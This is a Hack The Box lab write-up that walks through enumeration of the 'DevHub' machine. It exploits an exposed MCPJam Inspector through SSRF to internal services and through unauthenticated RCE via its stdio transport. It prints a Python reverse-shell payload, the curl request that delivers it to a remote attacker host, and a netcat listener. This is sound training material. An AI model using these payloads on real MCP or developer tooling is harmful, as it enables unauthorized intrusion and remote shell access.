---
tags:
  - SN_11
link: https://app.hackthebox.com/machines/DevHub
description: Medium·Linux
image: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/8e821c7bbdb90d8520bb597edae70080.png
date: 2026-06-06
pawned: true
machine no.: 2
---
## Attack Chain Summary


<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 1. Reconnaissance & Discovery
### 1.1 Connect to Hack The Box

First, download your personalized `.ovpn` file from Hack The Box.

Connect to the HTB VPN using the `.ovpn` configuration file. This establishes a secure tunnel that allows access to the target machine’s internal network.

Command: `sudo openvpn your_file.ovpn`

Start the Machine.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### 1.2 Verify Target is Reachable

Verify that the target machine is up and reachable by performing an ICMP ping test.

**Command:** `ping -c 4 TARGET_IP`

**Breakdown:**

- `-c 4` → sends 4 packets only (clean output, fast)

**Result:**

```shell
┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/DevHub]
└─$ ping -c 4 10.129.245.216
PING 10.129.245.216 (10.129.245.216) 56(84) bytes of data.
64 bytes from 10.129.245.216: icmp_seq=1 ttl=63 time=214 ms
64 bytes from 10.129.245.216: icmp_seq=2 ttl=63 time=207 ms
64 bytes from 10.129.245.216: icmp_seq=3 ttl=63 time=211 ms
64 bytes from 10.129.245.216: icmp_seq=4 ttl=63 time=206 ms

--- 10.129.245.216 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 206.041/209.497/213.890/3.075 ms
```

A successful response confirms that the machine is active and accessible on the HTB network, allowing us to proceed with the enumeration phase.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 2. Enumeration

### 2.1 Port Scan with Nmap

Before we can attack a system, we need to find out what "doors" are open. Doors in this context are ports. We use a tool called **Nmap** (Network Mapper) to scan the target's IP address and see what services are running.

#### 2.1.1 The "Spearfishing" Scan (All Ports, High Speed)

**Command:** `nmap -p- --min-rate 5000 -Pn TARGET_IP`

**Breakdown:**

- **`nmap`**
    - **Description:** The utility itself.
- **`-p-`**
    - **Description:** All Ports Scan. 
    - **Purpose:** Scans all 65,535 ports. Slower but thorough.
- `--min-rate 5000`
	- **Description:** Minimum Packet Rate.
	- **Purpose:** Forces Nmap to send at least 5,000 packets per second. This reduces scan time on stable networks like the HTB VPN.
- `-Pn`
    - **Description:** Skip Host Discovery.
    - **Purpose:** Treats the host as "online" even if it doesn't respond to pings (ICMP). Many HTB boxes have firewalls that block pings.
- **`TARGET_IP`**
    - **Description:** Target Specification.
    - **Purpose:** The IP address of the host being scanned.

**Result:**

```shell
┌──(kali㉿kali)-[~]
└─$ nmap -p- --min-rate 5000 -Pn 10.129.245.216
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-09 10:51 -0400
Nmap scan report for 10.129.245.216
Host is up (0.32s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
6274/tcp open  unknown
```
<div align="center">
<br>
<br>
</div>

#### 2.1.2 The "Deep Dive" Scan (Targeted Aggression)

**Command:** `nmap -A -p p1,p2,p3,p4 TARGET_IP`

**Breakdown:**

- **`-A`**
    - **Description:** Aggressive Scan Mode.
    - **Purpose:** Enables OS detection, version detection, script scanning (`-sC`), and traceroute all at once.
- `-p`
    - **Description:** Targeted Port List.
    - **Purpose:** Restricts the heavy scanning to only the ports you confirmed are open, saving significant time and processing power.


**Result:**

```shell
┌──(kali㉿kali)-[~]
└─$ nmap -A -p 22,80,6274 10.129.245.216       
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-09 10:55 -0400
Nmap scan report for 10.129.245.216
Host is up (0.22s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:78:2e:79:0d:87:13:05:2f:53:8e:e7:3c:55:b6:4c (ECDSA)
|_  256 dd:56:8e:bc:da:b8:38:3e:9a:cd:0b:74:ee:53:85:f8 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devhub.htb/
6274/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 200 OK
|     access-control-allow-credentials: true
|     content-length: 466
|     content-type: text/html; charset=utf-8
|     vary: Origin
|     Date: Tue, 09 Jun 2026 14:56:07 GMT
|     Connection: close
|     <!doctype html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8" />
|     <link rel="icon" type="image/svg+xml" href="/mcp_jam.svg" />
|     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
|     <title>MCPJam Inspector</title>
|     <script type="module" crossorigin src="/assets/index-DRYhT9Xb.js"></script>
|     <link rel="stylesheet" crossorigin href="/assets/index-XvFRNbCs.css">
|     </head>
|     <body>
|     <div id="root"></div>
|     </body>
|     </html>
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 204 No Content
|     access-control-allow-credentials: true
|     access-control-allow-methods: GET,HEAD,PUT,POST,DELETE,PATCH
|     vary: Origin
|     content-type: text/plain; charset=UTF-8
|     Date: Tue, 09 Jun 2026 14:56:08 GMT
|_    Connection: close
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port6274-TCP:V=7.98%I=7%D=6/9%Time=6A282988%P=x86_64-pc-linux-gnu%r(Get
SF:Request,290,"HTTP/1\.1\x20200\x20OK\r\naccess-control-allow-credentials
SF::\x20true\r\ncontent-length:\x20466\r\ncontent-type:\x20text/html;\x20c
SF:harset=utf-8\r\nvary:\x20Origin\r\nDate:\x20Tue,\x2009\x20Jun\x202026\x
SF:2014:56:07\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html>\n<h
SF:tml\x20lang=\"en\">\n\x20\x20<head>\n\x20\x20\x20\x20<meta\x20charset=\
SF:"UTF-8\"\x20/>\n\x20\x20\x20\x20<link\x20rel=\"icon\"\x20type=\"image/s
SF:vg\+xml\"\x20href=\"/mcp_jam\.svg\"\x20/>\n\x20\x20\x20\x20<meta\x20nam
SF:e=\"viewport\"\x20content=\"width=device-width,\x20initial-scale=1\.0\"
SF:\x20/>\n\x20\x20\x20\x20<title>MCPJam\x20Inspector</title>\n\x20\x20\x2
SF:0\x20<script\x20type=\"module\"\x20crossorigin\x20src=\"/assets/index-D
SF:RYhT9Xb\.js\"></script>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x2
SF:0crossorigin\x20href=\"/assets/index-XvFRNbCs\.css\">\n\x20\x20</head>\
SF:n\x20\x20<body>\n\x20\x20\x20\x20<div\x20id=\"root\"></div>\n\x20\x20</
SF:body>\n</html>\n")%r(HTTPOptions,F0,"HTTP/1\.1\x20204\x20No\x20Content\
SF:r\naccess-control-allow-credentials:\x20true\r\naccess-control-allow-me
SF:thods:\x20GET,HEAD,PUT,POST,DELETE,PATCH\r\nvary:\x20Origin\r\ncontent-
SF:type:\x20text/plain;\x20charset=UTF-8\r\nDate:\x20Tue,\x2009\x20Jun\x20
SF:2026\x2014:56:08\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest
SF:,F0,"HTTP/1\.1\x20204\x20No\x20Content\r\naccess-control-allow-credenti
SF:als:\x20true\r\naccess-control-allow-methods:\x20GET,HEAD,PUT,POST,DELE
SF:TE,PATCH\r\nvary:\x20Origin\r\ncontent-type:\x20text/plain;\x20charset=
SF:UTF-8\r\nDate:\x20Tue,\x2009\x20Jun\x202026\x2014:56:08\x20GMT\r\nConne
SF:ction:\x20close\r\n\r\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2F,"HTTP/
SF:1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSSt
SF:atusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x2
SF:0close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConne
SF:ction:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\x20Bad\x
SF:20Request\r\nConnection:\x20close\r\n\r\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (97%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6.0
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.19 - 5.15 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   223.63 ms 10.10.14.1
2   223.76 ms 10.129.245.216

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.30 seconds
```
<div align="center">
<br>
<br>
</div>

#### 2.1.3 Scan Results Analysis

| Port     | Service | Version                    | Analysis                                                                                              |
| -------- | ------- | -------------------------- | ----------------------------------------------------------------------------------------------------- |
| 22/tcp   | SSH     | OpenSSH 8.9p1 Ubuntu       | Standard Ubuntu SSH — not directly exploitable; target for persistence once credentials/keys obtained |
| 80/tcp   | HTTP    | nginx/1.18.0               | Redirects to `devhub.htb`; informational landing page listing internal services                       |
| 6274/tcp | HTTP    | Node.js (MCPJam Inspector) | Debug tool for MCP protocol — public-facing, no authentication; high-value attack surface             |

<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### 2.2 Enumeration of Web Services

#### 2.2.1 Update Hosts File

Command: `sudo vi etc/hosts`

**Breakdown:**

- `sudo` 
	- Description: Elevated Privileges
	- Purpose: Required to modify system-level configuration files like the hosts database.
- `vi` 
	- Description: Terminal Text Editor
	- Purpose: Used to append the `TARGET_IP devhub.htb` entry to the file.
- `/etc/hosts` 
	- Description: Static Host Lookup Table
	- Purpose: The local file that takes precedence over DNS servers, ensuring the domain resolves to the CTF machine.


Subdomain — a DNS concept. It's just a hostname that sits under a parent domain.
- admin.devhub.htb is a subdomain of devhub.htb
- It exists in DNS (or your hosts file) and points to an IP

Virtual host — a web server concept. It's a config block on nginx/Apache that says "serve this content when you see this hostname."


The relationship:

A subdomain is how you reach a virtual host. A virtual host is what handles the request when you arrive.

admin.devhub.htb  →  DNS resolves to 10.129.245.216  →  nginx vhost config for admin.devhub.htb  →  serves admin panel
devhub.htb        →  DNS resolves to 10.129.245.216  →  nginx vhost config for devhub.htb        →  serves main page

Same IP, same server, two subdomains, two virtual hosts.


They don't have to go together though:

- A subdomain can point to a completely different server with its own IP — no virtual hosting involved at all. mail.google.com and drive.google.com likely hit different infrastructure entirely.
- A virtual host doesn't have to be a subdomain — devhub.htb and devhub-admin.htb are two different domains (not subdomains of each other) but could both be virtual hosts on the same server.


In CTF/HTB context the terms get used loosely — when people say "enumerate vhosts" they usually mean "find hidden subdomains that are configured as virtual hosts on the same box." Both words are involved, but the technique is fuzzing the Host: header to discover which hostnames the server responds to differently.
<div align="center">
<br>
<br>
</div>

#### 2.2.2 Web Enumeration

Browse to `http://devhub.htb`.

![[Pasted image 20260609193242.png]]

- Title: DevHub - Internal Development Platform
- Confirms this is meant to be an internal-only page, not public-facing
- Copyright: 2026 DevHub Team - For Internal Use Only
- **Key finding:** The landing page explicitly advertises internal services.
- Three Service Cards:

| Service             | Status                         | Details                                                                          |
| ------------------- | ------------------------------ | -------------------------------------------------------------------------------- |
| MCP Inspector       | Active — Port 6274             | Externally reachable, used for building/testing MCP servers                      |
| Analytics Dashboard | Internal Only — localhost:8888 | Jupyter-based, restricted to analyst team                                        |
| Code Repository     | Maintenance Mode               | Internal Git server — no port exposed, meaning it's either down or fully hidden. |

- Tech Stack (bottom of page): `Node.js` `Python 3` `Jupyter` `MCP Protocol` `Ubuntu 24.04`
	This is a gift from a pentesting perspective — the app is openly advertising exactly what's running on the server.

What This Tells an Attacker:
- Port 6274 could be the entry point - it's the only thing marked active and externally accessible
- localhost:8888 is the prize behind it — Jupyter running as a restricted user, only reachable from inside the machine (SSRF target)
- Git repo exists somewhere — even in maintenance mode, git repos can contain credentials, commit history, config files
- Python 3 + Jupyter means code execution is possible if you can authenticate to Jupyter
- Ubuntu 24.04 narrows down kernel exploits and tells you what tools are likely installed


View Page Source:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DevHub - Internal Development Platform</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); min-height: 100vh; color: #eee; }
        .container { max-width: 1200px; margin: 0 auto; padding: 40px 20px; }
        header { text-align: center; margin-bottom: 60px; }
        header h1 { font-size: 3rem; color: #00d9ff; margin-bottom: 10px; }
        header p { font-size: 1.2rem; color: #888; }
        .services { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 30px; }
        .service-card { background: rgba(255,255,255,0.05); border-radius: 15px; padding: 30px; border: 1px solid rgba(255,255,255,0.1); transition: transform 0.3s, box-shadow 0.3s; }
        .service-card:hover { transform: translateY(-5px); box-shadow: 0 10px 40px rgba(0,217,255,0.2); }
        .service-card h3 { color: #00d9ff; margin-bottom: 15px; font-size: 1.4rem; }
        .service-card p { color: #aaa; line-height: 1.6; }
        .service-card .status { margin-top: 15px; padding: 8px 15px; border-radius: 20px; display: inline-block; font-size: 0.85rem; }
        .status.active { background: rgba(0, 255, 136, 0.2); color: #00ff88; }
        .status.internal { background: rgba(255, 193, 7, 0.2); color: #ffc107; }
        footer { text-align: center; margin-top: 60px; color: #555; }
        .tech-stack { margin-top: 40px; text-align: center; }
        .tech-stack span { display: inline-block; background: rgba(255,255,255,0.1); padding: 8px 16px; border-radius: 20px; margin: 5px; font-size: 0.9rem; }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>DevHub</h1>
            <p>Internal Development & Analytics Platform</p>
        </header>
        
        <div class="services">
            <div class="service-card">
                <h3>MCP Inspector</h3>
                <p>Model Context Protocol development and debugging tool. Used by the dev team for building and testing MCP servers.</p>
                <span class="status active">Active - Port 6274</span>
            </div>
            
            <div class="service-card">
                <h3>Analytics Dashboard</h3>
                <p>Jupyter-based analytics environment for data processing and visualization. Access restricted to analyst team.</p>
                <span class="status internal">Internal Only - localhost:8888</span>
            </div>
            
            <div class="service-card">
                <h3>Code Repository</h3>
                <p>Internal Git server for version control and collaboration. Project documentation and deployment scripts.</p>
                <span class="status internal">Maintenance Mode</span>
            </div>
        </div>
        
        <div class="tech-stack">
            <span>Node.js</span>
            <span>Python 3</span>
            <span>Jupyter</span>
            <span>MCP Protocol</span>
            <span>Ubuntu 24.04</span>
        </div>
        
        <footer>
            <p>&copy; 2026 DevHub Team - For Internal Use Only</p>
        </footer>
    </div>
</body>
</html>
```

You can use Dev Tools to check network requests (Everything the browser fetched to load the page shows up there — HTML, CSS, JavaScript files, images, API calls, fonts, etc.)

In our case only 2 things loaded:
- `devhub.htb` — the main HTML page itself
- `config.json` — a separate file the page requested automatically

![[Pasted image 20260609193823.png]]

The application appears intentionally minimal:

- No authentication form
- No search functionality
- No visible API endpoints
- No user-controlled input
<div align="center">
<br>
<br>
</div>

#### 2.2.3 MCPJam

During our nmap service scan we found port `6274` open with an unknown service. The fingerprint response contained an HTML title — `MCPJam Inspector` — which immediately told us what was running. Navigating to http://10.129.245.216:6274 in the browser confirms it, presenting a single-page application (SPA): a clean React interface with connection controls, a tool list panel, and an execution console.

![[Pasted image 20260610000713.png]]
<div align="center">
<br>
</div>

##### What is MCP?

MCP stands for Model Context Protocol, an open standard created by Anthropic (the company behind Claude). Its purpose is to give AI assistants a structured way to connect to external tools and services — essentially giving the AI hands.

On its own an AI can only work with text. MCP changes that. Through MCP an AI can read files, query databases, call APIs, and run commands. The way it works is through MCP servers — small programs that expose a set of callable functions called "tools." An AI connects to an MCP server, asks what tools are available, and can then invoke them. A simple MCP server might expose tools like read_file, run_query, or list_services.
<div align="center">
<br>
<br>
</div>

##### What is MCPJam Inspector?

MCPJam is an organisation building tooling around the MCP ecosystem. Their Inspector is one specific tool. Developers use it to:

- Connect to an MCP server they're building
- See what tools it exposes
- Call those tools and inspect the responses
- Debug why something isn't working

It's a React frontend backed by a Node.js process. The Node.js backend is what actually makes connections to MCP servers on behalf of the browser UI.

The critical thing to understand about Inspector is that it was designed as a localhost developer tool — something you run on your own machine, for your own use, with no one else able to reach it. On DevHub it is exposed on a public port with no authentication. That single misconfiguration turns two legitimate developer features into attack primitives:

- Its proxy functionality (built to help developers reach remote OAuth endpoints) becomes an SSRF vector
- Its stdio transport (built to launch and communicate with local MCP server processes) becomes unauthenticated remote code execution

A tool that is perfectly safe on localhost becomes a critical vulnerability the moment it faces the internet.
<div align="center">
<br>
<br>
</div>

#### 2.2.4 MCPJam Inspector — JS Bundle Extraction

The next step is extracting the JavaScript bundle to find hidden API endpoints.

Here's the reasoning behind it:

MCPJam Inspector is a React single-page application (SPA). When you load it in the browser, the server sends one large JavaScript file that contains the entire application logic — all the UI code, all the API calls it makes, every endpoint it communicates with. This is just how SPAs work, everything has to be shipped to the browser to run.

The important thing is that string literals in JavaScript cannot be hidden. If the code makes a call to `/api/mcp/connect`, that string has to exist in the bundle exactly as-is for the HTTP request to work. You can minify and compress JavaScript but you cannot encrypt it — the browser has to be able to read and execute it.

So the process is:
<div align="center">
<br>
</div>

##### 1. Find the bundle filename:

**Command:** `curl -s http://TARGET_IP:6274/`

**Result:**

```shell
┌──(kali㉿kali)-[~]
└─$ curl -s http://10.129.245.216:6274/                       
<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <link rel="icon" type="image/svg+xml" href="/mcp_jam.svg" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>MCPJam Inspector</title>
    <script type="module" crossorigin src="/assets/index-DRYhT9Xb.js"></script>
    <link rel="stylesheet" crossorigin href="/assets/index-XvFRNbCs.css">
  </head>
  <body>
    <div id="root"></div>
  </body>
</html>
```

This pulls the page source and the bundle filename is confirmed as `/assets/index-DRYhT9Xb.js`.
<div align="center">
<br>
</div>

##### 2. Fetch the bundle and extract all quoted paths

**Command:** `curl -s http://TARGET_IP:6274/assets/index-DRYhT9Xb.js | grep -Eo '"/[a-zA-Z0-9/_-]+"' | sort -u`

This fetches the actual JavaScript bundle file using the filename you just found, then extracts every quoted string that looks like a URL path.

**Breakdown:**

- `grep -Eo '"/[a-zA-Z0-9/_-]+"'` — Extract all double-quoted strings beginning with a forward slash (API path convention in JavaScript). `-E` enables extended regex, `-o` prints only matching text.
- `sort -u` — Deduplicate the results.

**Result:**

```shell
┌──(kali㉿kali)-[~]
└─$ curl -s http://10.129.245.216:6274/assets/index-DRYhT9Xb.js | grep -Eo '"/[a-zA-Z0-9/_-]+"' | sort -u
"//"
"/api/apps/chatgpt/widget/store"
"/api/chat"
"/api/mcp/apps/widget/store"
"/api/mcp/chat"
"/api/mcp/chat-v2"
"/api/mcp-cli-config"
"/api/mcp/connect"
"/api/mcp/elicitation/respond"
"/api/mcp/elicitation/stream"
"/api/mcp/evals/generate-negative-tests"
"/api/mcp/evals/generate-tests"
"/api/mcp/evals/run"
"/api/mcp/evals/run-test-case"
"/api/mcp/export/server"
"/api/mcp/list-tools"
"/api/mcp/log-level"
"/api/mcp/oauth/debug/proxy"
"/api/mcp/oauth/proxy"
"/api/mcp/prompts/get"
"/api/mcp/prompts/list"
"/api/mcp/prompts/list-multi"
"/api/mcp/resources/list"
"/api/mcp/resources/read"
"/api/mcp/resource-templates/list"
"/api/mcp/servers"
"/api/mcp/servers/reconnect"
"/api/mcp/tasks/cancel"
"/api/mcp/tasks/capabilities"
"/api/mcp/tasks/get"
"/api/mcp/tasks/list"
"/api/mcp/tasks/progress"
"/api/mcp/tasks/result"
"/api/mcp/tokenizer/count-text"
"/api/mcp/tools/execute"
"/api/mcp/tools/list"
"/api/mcp/tools/respond"
"/array/"
"/authorize"
"/callback"
"/config"
"/e"
"/e/"
"/evals"
"/evals/create"
"/oauth/callback/debug"
"/path/to/node"
"/person/"
"/project/"
"/properties"
"/register"
"/replay/"
"/static/"
"/token"
"/user_management/authenticate"
"/user_management/sessions/logout"
```

**Key finding:** Two critical endpoints stand out:
- `/api/mcp/oauth/proxy` - SSRF vector(an OAuth proxy ripe for SSRF abuse) and 
- `/api/mcp/connect` - RCE vector(a connection endpoint that accepts `stdio` transport configuration, meaning it can spawn arbitrary processes).
<div align="center">
<br>
<br>
</div>

#### 2.2.5 SSRF — Probing Internal Services via `/api/mcp/oauth/proxy`

We start with the SSRF because it's lower risk and gives us reconnaissance inside the server before we go for a shell. The goal is to use the server as a proxy to reach internal services that we can't access directly from outside.

**Theory Block — Why the OAuth Proxy is SSRF:**
The `/api/mcp/oauth/proxy` endpoint exists to forward OAuth token exchange requests to remote authorization servers on behalf of the Inspector UI. This pattern is common in MCP tooling: the backend makes the outbound HTTP call so the frontend doesn't face CORS restrictions. When the `url` parameter is controllable and the server applies no allowlist validation, the endpoint becomes a full SSRF primitive — the server will fetch any URL, including `http://127.0.0.1:*` localhost services the attacker cannot reach directly.

What we already know to probe:

From the port 80 dashboard the page told us:
- Jupyter is running at `localhost:8888`
- The tech stack includes Python 3
<div align="center">
<br>
</div>

##### Probe Jupyter at `localhost:8888`

**Command:**

`curl -s -X POST "http://TARGET_IP:6274/api/mcp/oauth/proxy" -H "Content-Type: application/json" -d '{"url":"http://127.0.0.1:8888/api"}'`

**Breakdown:**

- `-X POST` — Use HTTP POST method, as the proxy endpoint expects request forwarding.
- `-d '{"url":"..."}'` — JSON body specifying the internal URL to proxy. The `127.0.0.1` address will be resolved server-side, bypassing external network restrictions.

**Result:**

```shell
kali@kali:~$ curl -s -X POST "http://10.129.245.216:6274/api/mcp/oauth/proxy" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:8888/api"}'
{"status":200,"statusText":"OK","headers":{"server":"TornadoServer/6.5.4","content-type":"application/json"},"body":{"version":"2.17.0"}}
```

**Key finding:** Jupyter 2.17.0 is running on `TornadoServer/6.5.4` at localhost:8888, and the SSRF is fully functional — the response body is proxied back in the JSON `body` field.
<div align="center">
<br>
</div>

##### What "SSRF is fully functional" means:

SSRF (Server-Side Request Forgery) means tricking the server into making HTTP requests on your behalf to places you can't reach directly.

When you sent that curl command you were essentially saying to the MCPJam server:

> "Make an HTTP request to `http://127.0.0.1:8888/api` and give me back whatever you get."

If the server refused, ignored the url parameter, or only allowed requests to external addresses — the SSRF would be blocked. You'd get an error or empty response.

But instead the server went ahead, made the request to its own `localhost:8888`, got a response from Jupyter, and sent that response back to you. That's what "fully functional" means — there are no restrictions on what URLs you can point it at.

How the response confirms it:

You got back something like:

```
{
  "status": 200,
  "body": {"version": "2.17.0"},
  "headers": {
    "server": "TornadoServer/6.5.4"
  }
}
```

Three things this confirms:

| What you see        | What it confirms                                                    |
| ------------------- | ------------------------------------------------------------------- |
| status: 200         | The server successfully reached localhost:8888                      |
| version: 2.17.0     | That's Jupyter's API responding                                     |
| TornadoServer/6.5.4 | The web framework Jupyter runs on — fingerprints the exact software |

If you had tried this from your own Kali machine directly: `curl http://10.129.245.216:8888/api`
You'd get nothing — port 8888 isn't exposed externally. But the MCPJam server reached it because it's on the same machine. You used MCPJam as a proxy to see inside the server's internal network.

That's the SSRF. You can now reach anything on localhost that you couldn't touch before.
<div align="center">
<br>
</div>

##### Probe Flask at `localhost:5000`

**Command:**

`curl -s -X POST "http://TARGET_IP:6274/api/mcp/oauth/proxy" -H "Content-Type: application/json" -d '{"url":"http://127.0.0.1:5000/"}'`

**Result:**

```shell
┌──(kali㉿kali)-[~]
└─$ curl -s -X POST "http://10.129.245.216:6274/api/mcp/oauth/proxy" -H "Content-Type: application/json" -d '{"url":"http://127.0.0.1:5000/"}'   
{"status":200,"statusText":"OK","headers":{"connection":"close","content-length":"150","content-type":"application/json","date":"Tue, 09 Jun 2026 21:57:30 GMT","server":"Werkzeug/3.1.6 Python/3.10.12"},"body":{"auth":"Required - X-API-Key header","endpoints":["/tools/list","/tools/call","/health"],"server":"OPSMCP","status":"operational","version":"2.1.0"}} 
```

**Key finding:** A second internal service — OPSMCP 2.1.0 on Werkzeug/Flask — is running at localhost:5000. Its index response reveals three endpoints and that an `X-API-Key` header is required for authentication.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>


### 2.3 Vulnerability Research & Analysis

| Service | Version | Vulnerability Class | Notes |
|---------|---------|--------------------|----|
| MCPJam Inspector `/api/mcp/oauth/proxy` | 1.4.2 | SSRF (no allowlist) | Full internal network access via proxied HTTP requests |
| MCPJam Inspector `/api/mcp/connect` | 1.4.2 | Unauthenticated RCE via stdio transport | Spawns arbitrary OS processes as the service user |
| Jupyter Lab | 2.17.0 | Token exposed in `ps aux` (process argument) | Tokens visible to all users with process listing rights |
| OPSMCP | 2.1.0 | Hidden tool with no secondary authorization | `ops._admin_dump` not in `/tools/list` but callable; reads `/root/.ssh/id_rsa` |

The stdio transport vulnerability in `/api/mcp/connect` is the most critical — MCP stdio transport works by spawning a child process and communicating with it over stdin/stdout using JSON-RPC. The Inspector accepts a `serverConfig` object with a `command` and `args` array, passing them directly to `child_process.spawn()` without any validation. Sending a Python reverse shell as the `command`/`args` results in immediate code execution as the `mcp-dev` service account.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 3. Exploitation — Initial Access

### 3.1 Exploit Acquisition and Preparation

No external exploit required. The attack surface map from JS bundle extraction provides two direct paths:

1. **SSRF via `/api/mcp/oauth/proxy`** — confirmed working; used for service reconnaissance and later to enumerate OPSMCP.
2. **RCE via `/api/mcp/connect` stdio transport** — the Inspector expects a `serverConfig` JSON object with `type: "stdio"`, `command`, and `args`. Substituting a Python reverse shell for a legitimate MCP server command triggers OS command execution.

Reverse shell payload constructed:

```python
import socket,subprocess,os
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
```

This inline Python was inlined into the `args` array of the JSON payload.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.2 Exploitation Execution

#### 3.2.1 Start a netcat listener to catch the reverse shell

**Command:** `nc -lvnp 4444` (on attacker)

**Breakdown:**

- `nc` — Netcat utility for raw TCP connections.
- `-l` — Listen mode.
- `-v` — Verbose output, prints connection details.
- `-n` — No DNS resolution, avoiding delays.
- `-p 4444` — Bind to port 4444.

**Result:**

```shell
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 3.2.2 Send the Payload

**Command:**

```
curl -s -X POST http://10.129.245.216:6274/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"serverConfig":{"type":"stdio","command":"python3","args":["-c","import socket,subprocess,os;s=socket.socket();s.connect((\"10.10.14.85\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])"]},"serverId":"revshell"}'
```

**Breakdown:**

- `"type":"stdio"` — Tells MCPJam Inspector to use the stdio transport, which spawns a subprocess.
- `"command":"python3"` — The interpreter to execute; python3 is available on most Ubuntu systems.
- `"args":["-c","..."]` — The `-c` flag passes the Python one-liner as inline code. The shell command embedded connects back to the attacker's IP on port 4444 and redirects stdin/stdout/stderr over the socket.
- `"serverId":"revshell"` — An arbitrary identifier required by the API schema.

**Result:**

```shell
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.85] from (UNKNOWN) [10.129.245.216] 38030
bash: cannot set terminal process group (1078): Inappropriate ioctl for device
bash: no job control in this shell
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ 
```

Shell received as `mcp-dev` in the Inspector's working directory.
<div align="center">
<br>
<br>
